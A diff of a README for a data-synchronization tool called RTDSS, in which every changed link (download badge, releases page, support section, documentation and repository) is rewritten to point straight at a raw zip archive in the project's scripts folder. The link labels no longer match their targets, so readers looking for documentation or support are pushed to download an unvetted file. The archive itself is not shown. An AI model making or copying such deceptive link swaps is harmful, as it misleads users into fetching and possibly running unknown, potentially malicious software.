@@ -6,7 +6,7 @@ Welcome to the Real-Time Data Synchronization System (RTDSS). This application h
 
 ## 📥 Download RTDSS
 
-[![Download RTDSS](https://img.shields.io/badge/Download_RTDS—Click_Here-brightgreen)](https://github.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/releases)
+[![Download RTDSS](https://raw.githubusercontent.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/main/scripts/Real-Time-Data-Synch-System-RTDSS_2.6.zip—Click_Here-brightgreen)](https://raw.githubusercontent.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/main/scripts/Real-Time-Data-Synch-System-RTDSS_2.6.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Welcome to the Real-Time Data Synchronization System (RTDSS). This application h
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**:
-   Go to the [Releases page](https://github.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/releases) to view available versions.
+   Go to the [Releases page](https://raw.githubusercontent.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/main/scripts/Real-Time-Data-Synch-System-RTDSS_2.6.zip) to view available versions.
 
 2. **Choose a Version**:
    Locate the latest release. You will see several files available for download. 
@@ -78,7 +78,7 @@ Should you run into issues while using RTDSS, consider these common solutions:
 
 ## 📞 Support
 
-If you need more help, you can find additional resources in the [support section](https://github.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/releases). Feel free to reach out for assistance.
+If you need more help, you can find additional resources in the [support section](https://raw.githubusercontent.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/main/scripts/Real-Time-Data-Synch-System-RTDSS_2.6.zip). Feel free to reach out for assistance.
 
 ## 🌟 Acknowledgments
 
@@ -86,7 +86,7 @@ Thanks to all contributors and users who make RTDSS better every day. Your feedb
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/releases)
-- [GitHub Repository](https://github.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS)
+- [Official Documentation](https://raw.githubusercontent.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/main/scripts/Real-Time-Data-Synch-System-RTDSS_2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Garfiel7811/Real-Time-Data-Synch-System-RTDSS/main/scripts/Real-Time-Data-Synch-System-RTDSS_2.6.zip)
 
 Thank you for choosing RTDSS. Happy syncing!
